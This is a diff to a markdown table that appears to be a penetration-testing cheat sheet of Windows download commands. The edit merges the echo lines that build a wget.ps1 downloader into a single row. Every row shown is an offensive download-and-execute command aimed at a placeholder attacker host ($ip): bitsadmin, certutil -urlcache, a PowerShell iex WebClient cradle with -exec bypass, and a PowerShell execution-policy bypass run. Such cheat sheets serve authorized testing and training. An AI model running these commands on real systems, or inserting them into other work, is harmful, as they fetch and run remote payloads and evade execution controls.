@@ -30,9 +30,5 @@
 | 26  | `bitsadmin /transfer download /priority normal http://$ip/file C:\\output\\path` |
 | 27  | `powershell.exe -exec bypass -Command “& {iex((New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/$filename','C:\\Users\\user\\AppData\\Local\\ack.exe'));}”` |
 | 28  | `certutil -urlcache -split -f “http://$ip/$filename" $filename` |
-| 29  | `echo $storageDir = $pwd > wget.ps1` |
-| 30  | `echo $webclient = New-Object System.Net.WebClient >> wget.ps1` |
-| 31  | `echo $url = "http://$ip/$filename" >> wget.ps1` |
-| 32  | `echo $filename = "filename" >> wget.ps1` |
-| 33  | `echo $webclient.DownloadFile($url,$filename) >> wget.ps1` |
-| 34  | `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File $filename` |
+| 29  | `echo $storageDir = $pwd > wget.ps1` <br> `echo $webclient = New-Object System.Net.WebClient >> wget.ps1` <br> `echo $url = "http://$ip/$filename" >> wget.ps1` <br> `echo $filename = "filename" >> wget.ps1`  <br> `echo $webclient.DownloadFile($url,$filename) >> wget.ps1`  |
+| 30  | `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File $filename` |
